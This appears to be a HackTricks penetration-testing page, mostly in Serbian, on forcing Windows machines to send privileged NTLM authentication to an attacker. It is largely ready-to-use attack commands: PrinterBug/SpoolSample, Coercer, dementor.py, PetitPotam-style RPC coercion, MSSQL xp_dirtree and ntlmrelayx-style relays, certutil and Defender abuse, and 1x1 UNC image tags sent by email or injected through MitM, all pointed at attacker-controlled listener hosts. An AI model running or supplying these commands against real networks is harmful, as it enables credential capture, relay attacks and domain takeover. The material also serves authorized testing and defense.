# Prinudna privilegovana NTLM autentifikacija

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **remote authentication triggera** kodiranih u C# pomoću MIDL kompajlera, kako bi se izbegle zavisnosti od trećih strana.

## Zloupotreba Spooler Service-a

Ako je servis _**Print Spooler**_ **omogućen,** možete koristiti neke već poznate AD kredencijale da od print servera Domain Controller-a **zatražite** ažuriranje o novim print job-ovima i jednostavno mu kažete da **pošalje obaveštenje nekom sistemu**.\
Napomena: kada printer pošalje obaveštenje proizvoljnim sistemima, mora da se **autentifikuje na** tom **sistemu**. Zato napadač može naterati servis _**Print Spooler**_ da se autentifikuje na proizvoljnom sistemu, pri čemu će servis u ovoj autentifikaciji **koristiti computer account**.

U pozadini, klasični **PrinterBug** primitive zloupotrebljava **`RpcRemoteFindFirstPrinterChangeNotificationEx`** preko **`\\PIPE\\spoolss`**. Napadač prvo otvara handle ka printeru/serveru, a zatim prosleđuje lažno ime klijenta u `pszLocalMachine`, tako da ciljni spooler kreira notification channel **nazad ka hostu pod kontrolom napadača**. Zbog toga je efekat **outbound authentication coercion**, a ne direktno izvršavanje koda.<sup>[[2]](#references)</sup>\
Ako tražite **RCE/LPE** u samom spooler-u, pogledajte [PrintNightmare](printnightmare.md). Ova stranica je fokusirana na **coercion i relay**.

### Pronalaženje Windows servera na domenu

Pomoću PowerShell-a pribavite listu Windows računara. Serveri su obično prioritet, pa se fokusirajmo na njih:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Pronalaženje Spooler servisa koji osluškuju

Koristeći blago izmenjeni [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autora @mysmartlogin (Vincent Le Toux), proverite da li Spooler Service osluškuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Takođe možete koristiti `rpcdump.py` na Linuxu i potražiti protokol **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ili brzo testirajte hostove iz Linux-a pomoću **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Ako želite da **enumerišete coercion surfaces** umesto da samo proverite da li spooler endpoint postoji, koristite **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Ovo je korisno zato što vam prikaz endpoint-a u EPM-u samo govori da je print RPC interfejs registrovan. To **ne** garantuje da je svaka coercion metoda dostupna sa vašim trenutnim privilegijama niti da će host pokrenuti upotrebljiv tok autentikacije.

### Zatražite od servisa da se autentikuje prema proizvoljnom hostu

Možete kompajlirati [SpoolSample odavde](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ili koristite [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako ste na Linuxu
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Pomoću alata **Coercer** možete direktno ciljati spooler interfejse i izbeći nagađanje o tome koja je RPC metoda izložena:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forcing HTTP instead of SMB with WebClient

Classic PrinterBug obično izaziva **SMB** autentikaciju ka `\\attacker\share`, što je i dalje korisno za **capture**, **relay ka HTTP targetima** ili **relay tamo gde SMB signing nije prisutan**.\
Međutim, u modernim okruženjima, **SMB to SMB** relaying je često blokiran pomoću **SMB signing**, pa operatori često preferiraju da forsiraju **HTTP/WebDAV** autentikaciju.

Ako je servis **WebClient** pokrenut na targetu, listener se može navesti u formi koja primorava Windows da koristi **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Ovo je posebno korisno kada se kombinuje sa **`ntlmrelayx --adcs`** ili drugim HTTP relay targetima, jer se time izbegava oslanjanje na mogućnost SMB relay-a na coerced konekciji. Važna napomena je da **WebClient mora biti pokrenut** na žrtvi da bi HTTP/WebDAV varijanta radila.

### Kombinovanje sa Unconstrained Delegation

Ako je attacker već kompromitovao računar sa [Unconstrained Delegation](unconstrained-delegation.md), može **naterati printer da se autentifikuje prema ovom računaru**. Zbog unconstrained delegation-a, **TGT** od **computer account-a printera** biće **sačuvan u** **memoriji** računara sa unconstrained delegation-om. Pošto je attacker već kompromitovao ovaj host, moći će da **preuzme ovaj ticket** i zloupotrebi ga ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfejsi/opnums koji pokreću outbound autentifikaciju)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asinhroni print interfejs na istom spooler pipe-u; koristite Coercer za enumeraciju dostupnih metoda na datom hostu<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (takođe preko \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums koji se najčešće zloupotrebljavaju: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Napomena: Ove metode prihvataju parametre koji mogu sadržati UNC putanju (npr. `\\attacker\share`). Prilikom obrade, Windows će se autentifikovati (u kontekstu mašine/korisnika) prema tom UNC-u, čime se omogućavaju NetNTLM capture ili relay.\
Kod spooler abuse-a, **MS-RPRN opnum 65** ostaje najčešći i najbolje dokumentovani primitive, jer specifikacija protokola izričito navodi da server kreira notification channel prema client-u navedenom u `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN preko \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target pokušava da otvori prosleđenu putanju do backup loga i autentifikuje se prema UNC-u kojim upravlja attacker.<sup>[[1]](#references)</sup>
- Practical use: naterati Tier 0 asset-e (DC/RODC/Citrix/etc.) da emituju NetNTLM, a zatim izvršiti relay prema AD CS endpointima (ESC8/ESC11 scenariji) ili drugim privilegovanim servisima.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack je posledica propusta pronađenog u **Exchange Server `PushSubscription` feature-u**. Ova funkcija omogućava da se Exchange server natera da se, od strane bilo kog domain user-a sa mailbox-om, autentifikuje prema bilo kom hostu koji obezbedi client, preko HTTP-a.

Podrazumevano, **Exchange service radi kao SYSTEM** i ima prekomerne privilegije (konkretno, poseduje **WriteDacl privileges na domain-u pre 2019 Cumulative Update-a**). Ovaj propust može da se iskoristi za omogućavanje **relay-a informacija prema LDAP-u i naknadno izvlačenje domain NTDS baze**. U slučajevima kada relay prema LDAP-u nije moguć, ovaj propust se i dalje može koristiti za relay i autentifikaciju prema drugim hostovima unutar domain-a. Uspešna eksploatacija ovog attack-a omogućava neposredan pristup nalogu Domain Admin sa bilo kojim autentifikovanim domain user account-om.

## Unutar Windows-a

Ako ste već unutar Windows mašine, možete naterati Windows da se poveže sa serverom koristeći privilegovane naloge pomoću:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ili koristite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (binarni fajl potpisan od strane Microsofta) za izazivanje NTLM autentifikacije:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Ako znate **email address** korisnika koji se prijavljuje na mašinu koju želite da kompromitujete, možete mu jednostavno poslati **email sa slikom dimenzija 1x1** kao što je prikazano u nastavku.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
i kada je otvori, pokušaće da se autentifikuje.

### MitM

Ako možete da izvršite MitM napad na računar i ubacite HTML u stranicu koju će on videti, možete pokušati da u stranicu ubacite sliku poput sledeće:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Други начини за принудно покретање и phishing NTLM аутентификације


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Ако можете да ухватите [NTLMv1 challenges, овде прочитајте како да их crack-ујете](../ntlm/index.html#ntlmv1-attack).\
_Zapamtite да, како бисте crack-овали NTLMv1, морате да подесите Responder challenge на "1122334455667788"_

## References

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
